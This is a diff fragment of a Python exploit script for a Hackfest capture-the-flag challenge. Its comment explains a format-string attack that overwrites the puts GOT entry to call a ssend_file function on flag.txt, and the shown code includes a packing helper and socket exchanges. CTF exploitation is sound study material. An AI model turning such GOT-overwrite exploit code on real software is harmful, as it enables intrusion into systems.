@@ -14,6 +14,8 @@ after digging in the binary we found the ssend_file function, which take a file 
 best option was to overwrite puts GOT table puts(&buf) -> ssendfile(&buf) -> ssend_file(flag.txt).
 Not so hard, thanks to Hackfest organizers
 '''
+
+
 def p(data):
 	return pack("<I",data)
 
@@ -44,6 +46,9 @@ print s.recv(1024)
 s.send("1.1.1.1:2222\n")
 print s.recv(1024)
 print s.recv(2048)
+
+
+
 '''
 root@ubuntu:~#./fmt.py
 Select an option:
